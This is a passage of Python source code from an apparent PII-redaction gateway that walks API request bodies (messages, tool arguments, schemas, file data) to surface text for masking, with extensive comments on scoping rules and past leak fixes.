      2. A recognized extensionless text BASENAME (Dockerfile / Makefile / .gitignore / ...).
      3. NO MIME AND no recognized binary extension AND (extensionless OR unknown extension): ATTEMPT a strict
         UTF-8 decode of the bytes -- if it round-trips as valid UTF-8 text, treat it as text and redact it.
         A recognized binary extension or a present non-text MIME short-circuits to the passthrough note so we
         never UTF-8-misread a binary blob. This is the content-based backstop the extension allow-list missed."""
    fdata = part.get('file_data')
    if not isinstance(fdata, str) or not fdata:
        return
    mime = part.get('mime_type') or part.get('mimetype')
    fname = part.get('filename') or part.get('file_name') or part.get('name')
    prefix, payload = _split_data_uri(fdata)
    # a data: URI may itself carry the mime even when mime_type is absent. The media type is the token between
    # 'data:' and the first ';' or ',' (parameters like ';charset=utf-8' follow it before the ';base64,' tail).
    if mime is None and prefix:
        mm = re.match(r'^data:([^;,]*)', prefix)
        if mm and mm.group(1):
            mime = mm.group(1)
    has_mime = isinstance(mime, str) and mime.strip() != ''
    text_like = _is_text_mime(mime) or _is_text_filename(fname) or _is_text_basename(fname)
    # tier 3: undetermined type (no MIME, not a known binary extension) -> attempt a UTF-8 decode and let valid
    # text speak for itself. Guarded so a binary blob (known binary ext, or a present non-text MIME) never decodes.
    decode_attempt = (not text_like and not has_mime and not _has_binary_ext(fname)
                      and (_is_extensionless(fname) or not _is_text_filename(fname)))
    if text_like or decode_attempt:
        decoded = _decode_b64_text(payload)
        if decoded is not None:
            if _claim(claimed, part, 'file_data'):
                fields.append(FileDataField(part, 'file_data', kind, prefix, decoded))
            return
        # claimed text-like (or attempted) but undecodable -> fall through to passthrough note
    # Passthrough note: NEVER log the raw filename (it can itself carry PII, e.g. 'patient-john-doe.bin'); record
    # only a sanitized extension descriptor so the limitation is logged without leaking the name to gateway logs.
    notes.append({'mime': mime if isinstance(mime, str) else None,
                  'filename': _sanitize_filename_for_log(fname),
                  'reason': 'binary-or-undetermined' if not (text_like or decode_attempt) else 'undecodable-text'})


# Filename keys on a file / input_file part. `filename` / `file_name` are NOT deny-listed (the recursive sweep
# surfaces them already). `name` IS globally deny-listed because it is normally the structural tool/function NAME --
# but on a file / input_file part `name` is a FILENAME ALIAS (the same role _file_part_fields already reads it for),
# so a PII filename under `name` ('patient-john-doe.txt') would leak while filename/file_name are scanned.
_FILE_PART_FILENAME_KEYS = ('filename', 'file_name', 'name')


def _file_part_name_fields(part, kind, fields, claimed):
    """FILENAME-ALIAS scan (FIX-ROUND-4-R3 FIX D). In file / input_file part context, surface the filename keys --
    including the `name` ALIAS that is otherwise deny-listed as the structural tool/function name -- so a PII filename
    is SCANNED like filename/file_name (span-based: a non-PII filename matches nothing and passes through unchanged).
    Each surfaced key is CLAIMED so the recursive sweep does not double-surface filename/file_name (and so `name`,
    which the deny-list would otherwise skip in this structural-scope part, is surfaced here exactly once). `name`
    stays deny-listed everywhere ELSE (a tool/function NAME, an item structural name), so renaming a real tool is
    never at risk. The passthrough LOG note already sanitizes this same name (via _sanitize_filename_for_log on the
    fname that includes `name`), so the log never carries the raw filename either."""
    for fk in _FILE_PART_FILENAME_KEYS:
        if isinstance(part.get(fk), str) and part[fk] != '':
            if _claim(claimed, part, fk):
                fields.append(Field(part, fk, kind))


def _is_json_args_key(k):
    """A tool-argument JSON-string key: function_call/mcp_call/...`arguments`, custom_tool_call `input`, and any
    future '*arguments'/'*input' carrying a serialized JSON object. Its STRING value is parsed + surfaced
    value-by-value (the NER detects a bare name far better than the JSON blob) rather than redacted as one blob."""
    if not isinstance(k, str):
        return False
    return k == 'arguments' or k == 'input' or k.endswith('arguments') or k.endswith('input')


# USER-DATA GATEWAY KEYS (FIX-ROUND-4-R2 LEAK 1): in STRUCTURAL scope, a key whose VALUE is a free-form USER-DATA
# payload (not part of the request envelope or a JSON-Schema). Descending through one of these flips struct_scope
# to False, so the deny-list stops being consulted for everything INSIDE it -- a "name"/"id"/"customer_id" key in
# user data is PII, not a structural token. The deny-list still protects the ENVELOPE (top-level item fields) and
# the tool-DEFINITION parameters SCHEMA, neither of which is reached through one of these keys.
#   - output / outputs : function_call_output.output, mcp_call.output(s), code_interpreter_call.outputs, hosted-tool
#                        output payloads -- echoed tool RESULTS, all user data. A dict here with "id"/"name" holding
#                        PII is exactly what LEAK 1 was about.
#   - variables        : prompt.variables -- stored-prompt template substitutions, all user-supplied.
# `metadata` is user data top-to-bottom, so its walk STARTS struct_scope=False (no gateway needed).
# `content` is deliberately NOT a gateway: content PARTS are surfaced explicitly by _append_content_part_fields,
# and a content list still carries ROUTING parts (input_image.image_url, input_file routing) that must stay
# deny-listed -- flipping content to user-data scope would wrongly surface image_url and corrupt the request.
_USER_DATA_KEYS = frozenset({'output', 'outputs', 'variables'})

# SCHEMA-SUBTREE ENTRY KEYS (FIX-ROUND-4-R3 FIX A): a key whose VALUE is a JSON SCHEMA body. Once the walk descends
# through one of these, it is inside a tool-definition parameters SCHEMA (`parameters`) or a text.format json_schema
# (`schema`), and scope is decided by STRUCTURAL POSITION for the WHOLE subtree -- it STAYS structural regardless of
# any property name beneath it. A tool/text.format schema can legitimately declare a property literally named
# output/outputs/variables; rematching those _USER_DATA_KEYS names at arbitrary depth inside a schema wrongly flipped
# the walk into user-data scope, so schema type/required/property-name structure got treated as user data and risked
# OVER-REDACTION that corrupts the request. The user-data gateway must therefore NEVER fire inside a schema subtree:
# user-data scope is entered ONLY at the real user-data containers at their envelope position (prompt.variables map,
# top-level metadata, function_call_output.output, mcp/custom-tool output, message content), never on a bare
# property-name match inside a schema. `properties`/`$defs` are reached UNDER `parameters`/`schema`, so flagging the
# two roots is sufficient -- once in_schema is set it propagates to every deeper descent.
_SCHEMA_ENTRY_KEYS = frozenset({'parameters', 'schema', 'input_schema'})  # incl. the Anthropic tool-def schema key

# VALUE-LITERAL ENTRY KEYS (FIX-ROUND-4-R3-R2 ITEM 2): a JSON-Schema keyword whose VALUE is a model-picked LITERAL
# (or a list/object of literals), not a structural token. `enum` / `const` are NOT in _DENY_KEYS, so a DIRECT string
# literal under them is already surfaced -- but a NESTED object/array literal (const:{"name":"...","id":"..."} or
# enum:[{"contact":"..."}]) was recursed in STRUCTURAL scope, so its inner strings under deny-listed keys (name/id/
# *_url/...) were skipped and forwarded RAW. That regressed the enum/const hardening for valid NON-STRING JSON-Schema
# literals. Descending THROUGH an enum/const key therefore enters VALUE scope (struct_scope=False) for that subtree:
# every nested string in a literal is a model-picked value and must be surfaced for span-based redaction, regardless
# of the key name it sits under. Like the user-data gateway, once in value scope the subtree never returns to struct
# scope. Request-breaking protocol routing ids inside a literal STILL stay protected (value scope consults
# _is_request_breaking_key). `pattern` is NOT here -- a pattern value is a REGEX (kept deny-listed in _DENY_KEYS) and
# is reached as a SIBLING of enum/const, never THROUGH one, so flipping scope on enum/const never unprotects a pattern.
_VALUE_LITERAL_KEYS = frozenset({'enum', 'const'})


def _recurse_collect(node, kind, fields, notes, claimed, parent_denied=False, struct_scope=True, in_schema=False):
    """Defensive backstop: surface EVERY remaining free-text string reachable in `node`. Auto-covers shell_call/
    apply_patch_call/code_interpreter_call/mcp_call/custom_tool_call/file_search_call/web_search_call/computer_call/
    reasoning AND any FUTURE item type. Native JSON int/float leaves are surfaced as scan-only strings and, on a hit,
    written back as placeholder strings; bool/null stay structural. Already-claimed (container,key) pairs are skipped
    so explicitly-handled fields are not double-surfaced.

    CONTEXT-SCOPED DENY-LIST (FIX-ROUND-4-R2 LEAK 1). `struct_scope` decides whether the structural deny-list is
    consulted at all:
      - struct_scope=True  (the request ENVELOPE walk + the tool-DEFINITION parameters SCHEMA walk): a string under
        a deny-listed key (type/role/id/*_id/model/status/*_url routing keys; properties/required/enum-keyword/
        $ref/... schema tokens) is structural and NEVER surfaced -- redacting it would break the request or rewrite
        a schema token. This protects the tool's own `name`, the json_schema property names, the enum/const KEYWORD
        keys, routing ids/urls, etc.
      - struct_scope=False (inside a USER-DATA payload: prompt.variables values, top-level metadata, function_call_
        output/mcp/tool output dicts, free-form content objects): EVERY string value is surfaced regardless of key
        name. A key called name/id/customer_id/title/description in user data is PII, not a structural token, so the
        deny-list must NOT skip it. Over-redaction here is the safe error (it round-trips via rehydration).
    Descending through a USER-DATA GATEWAY key (_USER_DATA_KEYS) flips struct_scope to False for that subtree; once
    False it stays False for all deeper descents (user data never re-enters structural scope). A list element
    inherits its parent key's deny status (`parent_denied`), which only applies in structural scope.

    SCHEMA POSITION (FIX-ROUND-4-R3 FIX A). `in_schema` is set once the walk descends through a SCHEMA-entry key
    (_SCHEMA_ENTRY_KEYS: a tool-definition `parameters`, a text.format `schema`) and PROPAGATES to every deeper
    descent. While in_schema is True the USER-DATA GATEWAY is SUPPRESSED: a property literally named
    output/outputs/variables is a SCHEMA property name, not a user-data container, so it must NOT flip scope to
    user-data and trigger over-redaction of schema structure. Scope is thus decided by STRUCTURAL POSITION (which
    envelope container we descended through), never by rematching a key NAME inside a schema subtree."""
    if isinstance(node, dict):
        # an input_file / file part: surface its filename keys (incl. the deny-listed `name` ALIAS, FIX D) for
        # scanning, and -- when it carries inline base64 -- route file_data through the dedicated decode-or-note path.
        if node.get('type') in ('input_file', 'file'):
            _file_part_name_fields(node, kind, fields, claimed)
            if isinstance(node.get('file_data'), str):
                _file_part_fields(node, kind, fields, notes, claimed)
        # snapshot the items: a redacted-KEY rename mutates `node` LATER (during redaction, after extraction), so
        # iteration here is not affected -- but iterate a snapshot defensively so a future in-loop mutation is safe.
        for k, v in list(node.items()):
            # OPAQUE ciphertext (reasoning.encrypted_content): never surface the KEY or its VALUE for redaction, in
            # ANY scope -- it must round-trip byte-for-byte or upstream decryption fails (invalid_encrypted_content).
            if isinstance(k, str) and k in _OPAQUE_KEYS:
                continue
            # STRUCTURAL scope: the full deny-list applies. USER-DATA scope: nothing is structural EXCEPT a
            # request-breaking key (a protocol routing id: file_id/container_id/call_id/...) -- redacting one corrupts
            # the request in any context, so those stay protected; every other key (name/id/customer_id/file_data/...)
            # surfaces as user PII. (An inline-upload file_data on an input_file/file PART is protected separately by
            # _DENY_KEYS in structural scope + the _file_part_fields claim, so a user-data file_data field is scanned.)
            denied = _is_denied_key(k) if struct_scope else _is_request_breaking_key(k)
            # SCHEMA POSITION (FIX A): once inside a schema subtree it stays a schema subtree for every deeper key.
            child_in_schema = in_schema or (isinstance(k, str) and k in _SCHEMA_ENTRY_KEYS)
            json_arg_object = (struct_scope and not child_in_schema and isinstance(k, str)
                               and _is_json_args_key(k) and isinstance(v, (dict, list)))
            # a user-data gateway key opens a user-data subtree; once in user data we never return to struct scope.
            # The gateway is SUPPRESSED inside a schema (FIX A): a SCHEMA property named output/outputs/variables is a
            # structural property name, NOT a user-data container, so it must never flip scope by a bare name match.
            # A VALUE-LITERAL key (enum/const, FIX-ROUND-4-R3-R2 ITEM 2) ALSO opens a non-structural (value) subtree:
            # a nested object/array literal under enum/const is a model-picked value, so its inner strings must be
            # surfaced regardless of key name (the deny-list would otherwise skip a nested name/id/*_url literal).
            # enum/const flip scope in BOTH schema and non-schema position (a const is a value literal either way).
            child_scope = struct_scope and not (
                isinstance(k, str)
                and ((k in _USER_DATA_KEYS and not child_in_schema) or k in _VALUE_LITERAL_KEYS)
                or json_arg_object)
            # USER-DATA OBJECT KEY (FIX-ROUND-4-R2 LEAK 1 round-2 :515): a dict KEY in user-data scope can itself BE
            # PII (an email used as the key of a metadata / prompt.variables / function_call_output.output map). The
            # walk previously read keys only as traversal metadata, so PII-as-key bypassed the gate. Surface the KEY
            # for span-based redaction when: we are in user-data scope, the key is a non-empty string, it is NOT a
            # request-breaking routing key (renaming file_id/*_url corrupts the request), it is NOT already a
            # placeholder, and it is not already claimed as a key. The KEY and its string VALUE share one _DictEntry
            # so a key rename never desyncs the value handle (the value follows the renamed key via a shared cell).
            # FIX-ROUND-4-R3-R2 ITEM 3: a _is_json_args_key match is NO LONGER an exclusion here. _is_json_args_key
            # matches ANY key ending with 'input'/'arguments', so a USER-DATA key such as
            # 'marie.gagnon@example.com_input' (a PII email that merely ends in 'input') was skipped from key scanning
            # entirely -- a leak. The slot-based JSON-args handling is a request-ENVELOPE mechanism (function_call.
            # arguments / mcp_call.arguments on agentic items, reached in STRUCTURAL scope); it is gated to struct_scope
            # below, so in user-data scope a key ending in input/arguments is just a user-data string key and its value
            # is a plain user-data value. Surfacing the key here can therefore never desync a json-args slot.
            surface_key = (not struct_scope and isinstance(k, str) and k != ''
                           and not _is_request_breaking_key(k)
                           and not _PH_FULL_RE.fullmatch(k)
                           and (id(node), '__key__', k) not in claimed)
            entry = None
            if surface_key:
                claimed.add((id(node), '__key__', k))
                entry = _DictEntry(node, k)
                fields.append(Field(entry.key_handle, '__key__', kind))
            # ACCEPTED TRADEOFF (numeric schema literals): `not in_schema` exempts numeric leaves inside a tool-
            # DEFINITION schema from scanning. This is deliberate -- redacting a numeric schema literal would
            # rewrite it to a placeholder STRING, breaking the property's declared `integer`/`number` type and
            # producing a JSON-Schema-draft-2020-12 400 upstream (regressed once; guarded by
            # test_tool_schema_numeric_constraints_not_corrupted). The cost: a NUMERIC PII literal placed
            # specifically under enum/const in a tool SCHEMA (e.g. const:4111111111111111) is not redacted. This
            # is near-nonexistent in real traffic -- PII flows as tool-CALL ARGUMENTS (model/user values, scanned
            # here with in_schema=False), not as schema constraints. STRING schema literals ARE always surfaced.
            # A precision-gated redaction (redact only checksum-validated cards/IBANs, accepting a 400 on that
            # rare real-card-in-schema case) is a tracked post-launch hardening, not a launch blocker.
            if isinstance(v, str) or (_is_scan_number(v) and not in_schema):
                if denied:
                    continue
                if (id(node), k) in claimed:
                    continue
                # tool-argument JSON string (mcp_call.arguments / custom_tool_call.input / any '*arguments'/'*input')
                # -> parse + surface each inner string value (clean for the NER), JSON-safe writeback. Falls back
                # to whole-string redaction if the value is not valid JSON. _surface_json_args claims the slot.
                # GATED to STRUCTURAL scope (FIX-ROUND-4-R3-R2 ITEM 3): slot-based json-args handling is a request-
                # ENVELOPE protocol mechanism (function_call/mcp_call arguments live on agentic items in struct scope).
                # In USER-DATA scope a key ending in input/arguments is a user-data field name (its KEY may even be PII,
                # now surfaced above), so its value is treated as a plain user-data string -- never parsed as a
                # json-args slot (which is keyed by the exact key string and would desync if the PII KEY is renamed).
                if isinstance(v, str) and struct_scope and _is_json_args_key(k):
                    _surface_json_args(node, k, kind, fields, claimed)
                    continue
                claimed.add((id(node), k))
                # if the KEY was surfaced, the VALUE must index via the shared current-key cell so it follows a key
                # rename; otherwise it is a plain (node, k) Field exactly as before.
                if entry is not None:
                    fields.append(Field(entry.value_handle, '__val__', kind))
                else:
                    fields.append(Field(node, k, kind))
            else:
                _recurse_collect(v, kind, fields, notes, claimed, parent_denied=denied, struct_scope=child_scope,
                                 in_schema=child_in_schema)
    elif isinstance(node, list):
        for i, v in enumerate(node):
            if isinstance(v, str) or (_is_scan_number(v) and not in_schema):
                if parent_denied:
                    continue
                if (id(node), i) in claimed:
                    continue
                claimed.add((id(node), i))
                fields.append(Field(node, i, kind))
            else:
                _recurse_collect(v, kind, fields, notes, claimed, parent_denied=parent_denied,
                                 struct_scope=struct_scope, in_schema=in_schema)


def _collect_json_args_values(node, root, slot_container, slot_key, kind, fields):
    """Recursively surface EVERY STRING/NUMBER VALUE -- AND every OBJECT KEY -- inside a PARSED tool-argument object
    as its own clean Field (so the NER scans a bare name or numeric ID, not the hard-to-detect JSON blob). The structural deny-list
    (_DENY_KEYS) is DELIBERATELY NOT applied here: that deny-list protects the Responses REQUEST SCHEMA (routing/
    identity fields, JSON-Schema structural tokens). The keys INSIDE a tool's arguments payload are APPLICATION-
    DEFINED data field names -- a value under 'name'/'url'/'type'/'id'/'*_id' there is real model-visible free text
    (a person's name, a contact URL, a record identifier), NOT a structural token, and skipping it forwards that
    value RAW to the model (the FIX-ROUND-2 CRITICAL leak: {"name":"Priya McCallum"} was skipped because 'name' is in
    _DENY_KEYS). Span-based redaction makes surfacing every value safe -- an ordinary value ('high', 'object') never
    matches a PII pattern and passes through unchanged, while a real name/email/phone is masked.

    OBJECT KEYS (FIX-ROUND-4-R2 LEAK 2): PII encoded AS a JSON object key (e.g. {"user@example.com": "..."} -- an
    email used as the key) was previously forwarded RAW because only VALUES were walked. Each object key is now also
    surfaced as a Field; when the gate detects PII in it, the key is renamed to its placeholder and the whole object
    re-serialized (JSON-safe). A key-Field and its value-Field share one _JsonArgsEntry with a mutable current-key
    cell, so a key rename never desyncs the value-Field. The response-side _rehydrate_json restores placeholders in
    KEYS too (symmetry), so an email-key -> placeholder -> email-key round-trip is lossless."""
    if isinstance(node, dict):
        for k, v in list(node.items()):
            entry = _JsonArgsEntry(node, root, slot_container, slot_key, k)
            if isinstance(k, str):
                # surface the object KEY itself for redaction (PII-as-key). Renaming re-serializes JSON-safely.
                fields.append(Field(entry.key_handle, '__key__', kind))
            # NOTE: tool-argument values are model-picked USER DATA, never a JSON schema -- numerics here must
            # ALWAYS be scanned. Do NOT add an `in_schema` guard in this function (it has no such param; the
            # schema-scope guard belongs only to _recurse_collect). A blanket replace_all once did and 500'd
            # this route with NameError -- keep the bare _is_scan_number(v) here.
            if isinstance(v, str) or _is_scan_number(v):
                # the VALUE indexes via the shared current-key cell, so it survives the sibling key rename above.
                fields.append(Field(entry.value_handle, '__val__', kind))
            else:
                _collect_json_args_values(v, root, slot_container, slot_key, kind, fields)
    elif isinstance(node, list):
        for i, v in enumerate(node):
            if isinstance(v, str) or _is_scan_number(v):  # tool-arg values = user data, always scan numerics
                fields.append(Field(_JsonArgsContainer(node, root, slot_container, slot_key), i, kind))
            else:
                _collect_json_args_values(v, root, slot_container, slot_key, kind, fields)


def _reject_dup_keys(pairs):
    """json.loads object_pairs_hook that RAISES if an object carries a duplicate key. A plain parse would collapse
    duplicates to the last value -- the earlier values then never reach the neural gate AND are silently dropped on
    re-dump (FIX-ROUND-3 MEDIUM). Raising routes _surface_json_args to whole-string redaction, which scans the full
    arguments string (so every duplicate's PII is still masked span-wise) and preserves the original bytes."""
    seen = set()
    for k, _ in pairs:
        if k in seen:
            raise ValueError('duplicate object key in tool-argument JSON')
        seen.add(k)
    return dict(pairs)


def _emit_dup(node):
    """Serialize a faithful dup-preserving tree (with _DupObj nodes -- the request-side REUSE of the response-side
    _DupObj defined below, whose pairs are now mutable [key,value] lists) back to a JSON string, preserving duplicate
    keys verbatim and re-escaping every string via json.dumps(ensure_ascii=False) -- so a redacted key/value with
    quotes or backslashes stays valid JSON. Mirrors json.dumps for every non-_DupObj node. (Distinct from the
    response-side _dump_rehydrated_dup_safe, which serializes WHILE rehydrating placeholders.)"""
    if isinstance(node, _DupObj):
        return '{' + ','.join(json.dumps(k, ensure_ascii=False) + ':' + _emit_dup(v) for k, v in node.pairs) + '}'
    if isinstance(node, list):
        return '[' + ','.join(_emit_dup(x) for x in node) + ']'
    return json.dumps(node, ensure_ascii=False)


class _DupSlot:
    """A (container,key)-style proxy onto ONE slot of the faithful dup-preserving tree (a [key,value] pair-list of a
    _DupObj, or a native JSON array). `target` is the mutable list, `idx` the position (0=key / 1=value of a pair, or
    an array index). Reads return the slot; every write re-emits the WHOLE faithful root into the arguments-string slot
    via _emit_dup, so duplicates are preserved + each redacted value lands inside valid JSON. Positional slots mean a
    KEY rename never collides with a sibling (unlike the dict path), so no disambiguation dance is needed here."""
    __slots__ = ('_target', '_idx', '_root', '_slot_container', '_slot_key')

    def __init__(self, target, idx, root, slot_container, slot_key):
        self._target = target
        self._idx = idx
        self._root = root
        self._slot_container = slot_container
        self._slot_key = slot_key

    def __getitem__(self, key):
        return self._target[self._idx]

    def __setitem__(self, key, value):
        self._target[self._idx] = value
        self._slot_container[self._slot_key] = _emit_dup(self._root)


def _collect_dup_args(node, root, slot_container, slot_key, kind, fields):
    """Walk a faithful dup-preserving tree, surfacing EVERY string KEY and string/number VALUE as its own Field --
    same contract as _collect_json_args_values, but over _DupObj pairs so duplicate keys survive and the EARLIER
    value of a duplicate (invisible to a plain dict) is scanned + round-tripped. Each Field's write re-emits the root
    via _emit_dup."""
    if isinstance(node, _DupObj):
        for pair in node.pairs:
            k, v = pair[0], pair[1]
            if isinstance(k, str):
                fields.append(Field(_DupSlot(pair, 0, root, slot_container, slot_key), 0, kind))
            if isinstance(v, str) or _is_scan_number(v):  # tool-arg values = user data, always scan numerics
                fields.append(Field(_DupSlot(pair, 1, root, slot_container, slot_key), 1, kind))
            else:
                _collect_dup_args(v, root, slot_container, slot_key, kind, fields)
    elif isinstance(node, list):
        for i, v in enumerate(node):
            if isinstance(v, str) or _is_scan_number(v):  # tool-arg values = user data, always scan numerics
                fields.append(Field(_DupSlot(node, i, root, slot_container, slot_key), i, kind))
            else:
                _collect_dup_args(v, root, slot_container, slot_key, kind, fields)


def _surface_json_args(container, key, kind, fields, claimed):
    """Surface a tool-argument JSON STRING held at container[key] (function_call.arguments / mcp_call.arguments /
    custom_tool_call.input / any '*arguments'/'*input' JSON string). PARSE it and surface each inner string value
    as its own clean Field (the NER detects a bare name far better than the JSON form); each write re-serializes
    the parsed object back into this slot so the arguments string stays valid JSON. FALLBACK: if the value is NOT
    valid JSON (or not a JSON object/array of values to walk), surface it as the whole string for plain redaction
    -- never drop it. Returns True if it claimed the slot."""
    if not _claim(claimed, container, key):
        return False
    raw = container[key]
    parsed = None
    has_dup = False
    if isinstance(raw, str) and raw.strip():
        try:
            # object_pairs_hook detects DUPLICATE object keys (FIX-ROUND-3 MEDIUM): a plain json.loads collapses
            # {"assignee":"Jane Roe","assignee":"ok"} to the LAST value, so the first ("Jane Roe") is invisible to
            # the value collector AND would be silently dropped on re-dump. _reject_dup_keys raises on any duplicate.
            parsed = json.loads(raw, object_pairs_hook=_reject_dup_keys)
        except ValueError as e:
            # _reject_dup_keys raises ValueError('duplicate object key...') at ANY nesting depth. A malformed-JSON
            # JSONDecodeError is ALSO a ValueError -- distinguish by the sentinel message so only a real dup-key
            # object routes to the faithful path; malformed JSON falls through to whole-string redaction.
            has_dup = 'duplicate object key' in str(e)
            parsed = None
        except Exception:
            parsed = None
    if has_dup:
        # FAITHFUL DUP-KEY PATH (FIX-ROUND-5-R6, residual ~:859): the prior fallback scanned the RAW arguments string,
        # so a JSON-ESCAPED PII value (@, \n, \") inside a dup-key object evaded the span detector and leaked.
        # Re-parse PRESERVING all duplicates, surface every key+value (the NER sees the DECODED value), and re-emit
        # on write -- so every duplicate's PII (escaped or not) is masked and NO key is collapsed/dropped on re-dump.
        try:
            tree = json.loads(raw, object_pairs_hook=_DupObj)
        except Exception:
            tree = None
        if isinstance(tree, (_DupObj, list)):
            _collect_dup_args(tree, tree, container, key, kind, fields)
            return True
        # else fall through to whole-string redaction (never drop it)
    elif isinstance(parsed, (dict, list)):
        _collect_json_args_values(parsed, parsed, container, key, kind, fields)
        return True
    # not valid JSON, a bare JSON scalar, OR an undecodable dup tree -> fall back to whole-string redaction
    # (the whole arguments string is scanned span-wise so PII is still masked), never drop it.
    fields.append(Field(container, key, kind))
    return True


def _append_content_part_fields(content, kind, fields, claimed):
    """Surface every text-bearing part inside a `content` value (string OR list of typed parts). For a list, an
    {type:'input_text'|'text'|'output_text'} part OR a {type:'refusal'} part with a string payload is a field;
    input_image / non-text parts are never touched here. (input_file parts are handled by the recursive sweep.)"""
    if isinstance(content, str):
        # caller decides the (container,key); a bare-string content is handled by the caller, not here.
        return
    if isinstance(content, list):
        for part in content:
            if not isinstance(part, dict):
                continue
            ptype = part.get('type')
            if ptype in ('input_text', 'text', 'output_text') and isinstance(part.get('text'), str):
                if _claim(claimed, part, 'text'):
                    fields.append(Field(part, 'text', kind))
            elif ptype == 'refusal' and isinstance(part.get('refusal'), str):
                if _claim(claimed, part, 'refusal'):
                    fields.append(Field(part, 'refusal', kind))


def extract_text_fields_responses(body):
    """Exhaustively surface EVERY model-visible text location so none leaks upstream. Two layers:

    LAYER 1 -- EXPLICIT handling of the well-known chat shapes, to preserve each one's precise 'kind' (redact_body
    uses kind for its prose heuristic + session derivation):
      - top-level `instructions` (string) -> kind 'system' (same precedence as a system prompt).
      - top-level `prompt.variables` -> every string value (a stored-prompt template substitution can carry PII).
        kind 'message'. A variable whose value is an input_text part ({type:'input_text', text}) is surfaced too.
      - `input` as a plain string -> kind 'message'.
      - `input` array items: `content` may be a string OR a list of typed parts. The item `role` maps to the
        kind vocabulary redact_body expects (system/developer -> 'system', tool/function_call_output -> 'tool_
        result', everything else -> 'message'). For a list content, every {type:'input_text'|'text'|'output_text'}
        part with a string `text` PLUS any {type:'refusal'} part is a field.
      - `function_call` items: the `arguments` JSON string (kind 'tool_result'). PII inside a JSON string value
        stays syntactically valid after a placeholder swap, so redacting the whole string as text is safe.
      - `function_call_output` items: `output`, a string OR an array of typed parts. kind 'tool_result'.

    LAYER 2 -- DEFENSIVE RECURSIVE BACKSTOP over body['input'] items, body['tools'], body['text'] (the structured-
    output `text.format` json_schema descriptions), and body['prompt']: every remaining reachable string whose KEY
    is not in the structural deny-list is surfaced as a Field (default kind 'tool_result' for agentic echoed I/O,
    unless an explicit role said otherwise). This auto-covers shell_call.
    action.commands (a LIST of command strings -> each element), apply_patch_call.operation.diff, code_interpreter_
    call.code/logs, mcp_call.arguments/output/error, custom_tool_call.input, file_search_call.results[].text,
    web_search_call.action.query, computer_call.action.text, reasoning summary/content, MCP server + tool/param
    descriptions in body['tools'], AND any FUTURE item type -- no enumeration, no whack-a-mole. input_file inline
    base64 file_data is decoded+redacted (text-like) or recorded as a documented passthrough note (binary).

    A single missed model-visible text field is a hard PII leak: extract too much (span-based redaction only
    changes detected PII substrings) over too little."""
    fields = []
    claimed = set()    # (id(container), key) pairs already surfaced explicitly, so the backstop won't re-add them
    notes = []         # structured file-passthrough notes (binary bytes not scanned); read via get_file_passthrough_notes

    instr = body.get('instructions')
    if isinstance(instr, str):
        if _claim(claimed, body, 'instructions'):
            fields.append(Field(body, 'instructions', 'system'))

    # top-level stored-prompt variables: every string value (and any input_text part nested in a value).
    prompt = body.get('prompt')
    if isinstance(prompt, dict):
        variables = prompt.get('variables')
        if isinstance(variables, dict):
            for vname, val in variables.items():
                if isinstance(val, str):
                    if _claim(claimed, variables, vname):
                        fields.append(Field(variables, vname, 'message'))
                elif (isinstance(val, dict)
                        and val.get('type') in ('input_text', 'text', 'output_text')
                        and isinstance(val.get('text'), str)):
                    if _claim(claimed, val, 'text'):
                        fields.append(Field(val, 'text', 'message'))
                elif isinstance(val, dict) and val.get('type') == 'refusal' and isinstance(val.get('refusal'), str):
                    if _claim(claimed, val, 'refusal'):
                        fields.append(Field(val, 'refusal', 'message'))
        # LAYER 2 backstop over the WHOLE `prompt` object (FIX-ROUND-3 HIGH leak): the explicit loop above only
        # surfaces TOP-LEVEL string variables and a few recognized part shapes. A variable whose value is a NESTED
        # object/array (e.g. {"ctx": {"deep": {"note": "..."}}} or {"recipients": ["..."]}) keeps its inner strings
        # RAW -- they would go upstream without the neural gate. The recursive sweep surfaces every remaining
        # reachable string whose KEY is not structural; _claim dedupes the ones already surfaced above, so this never
        # double-surfaces. kind 'message' (a stored-prompt substitution is user-supplied prose), not seeding session.
        _recurse_collect(prompt, 'message', fields, notes, claimed)

    inp = body.get('input')
    if isinstance(inp, str):
        if _claim(claimed, body, 'input'):
            fields.append(Field(body, 'input', 'message'))
    elif isinstance(inp, list):
        for item in inp:
            if not isinstance(item, dict):
                continue
            itype = item.get('type')
            role = item.get('role')
            kind = ('system' if role in ('system', 'developer')
                    else 'tool_result' if role in ('tool', 'function_call_output')
                    or itype in ('function_call_output', 'function_call')
                    else 'message')
            # function_call item: the `arguments` JSON string is echoed model-visible tool input. Parse it and
            # surface each inner string VALUE as its own clean field (the gate NER detects a bare name far better
            # than the same name buried in a serialized '{"k":"v"}' blob); writes re-serialize JSON-safely.
            if itype == 'function_call':
                if isinstance(item.get('arguments'), str):
                    _surface_json_args(item, 'arguments', 'tool_result', fields, claimed)
                elif isinstance(item.get('arguments'), (dict, list)):
                    _recurse_collect(item['arguments'], 'tool_result', fields, notes, claimed, struct_scope=False)
            # function_call_output item: `output` is a string OR an array of typed parts.
            if itype == 'function_call_output':
                out = item.get('output')
                if isinstance(out, str):
                    if _claim(claimed, item, 'output'):
                        fields.append(Field(item, 'output', 'tool_result'))
                else:
                    _append_content_part_fields(out, 'tool_result', fields, claimed)
            c = item.get('content')
            if isinstance(c, str):
                if _claim(claimed, item, 'content'):
                    fields.append(Field(item, 'content', kind))
            else:
                _append_content_part_fields(c, kind, fields, claimed)
            # LAYER 2 backstop over the WHOLE item: agentic item types (shell_call/apply_patch_call/mcp_call/...)
            # plus any future type. Default kind for echoed agentic tool I/O is 'tool_result' unless a role set
            # 'system'/'message' above -- keep that kind so redact_body's heuristics stay consistent.
            backstop_kind = kind if role in ('system', 'developer') else 'tool_result'
            _recurse_collect(item, backstop_kind, fields, notes, claimed)

    # LAYER 2 -- tool / function / MCP definitions: descriptions + custom-tool grammar are model-visible free text;
    # the deny-list leaves type/name/enum/property-names/$ref/required intact. kind 'tool_result' so the prose
    # heuristic + cheap-gate still scan them, WITHOUT letting a tool description seed session derivation (only an
    # explicit `instructions` / system-role item should set sys_text in redact_body).
    tools = body.get('tools')
    if isinstance(tools, list):
        _recurse_collect(tools, 'tool_result', fields, notes, claimed)

    # LAYER 2 -- top-level `text.format` structured-output schema: a json_schema response format carries a JSON
    # Schema whose `description` strings (root + per-property) are MODEL-VISIBLE free text and can embed PII. The
    # deny-list leaves type/name/format/enum/property-names/$ref/required/strict intact while the sweep surfaces
    # the description prose. Same kind 'tool_result' as tools so it scans WITHOUT seeding session derivation.
    text_cfg = body.get('text')
    if isinstance(text_cfg, dict):
        _recurse_collect(text_cfg, 'tool_result', fields, notes, claimed)

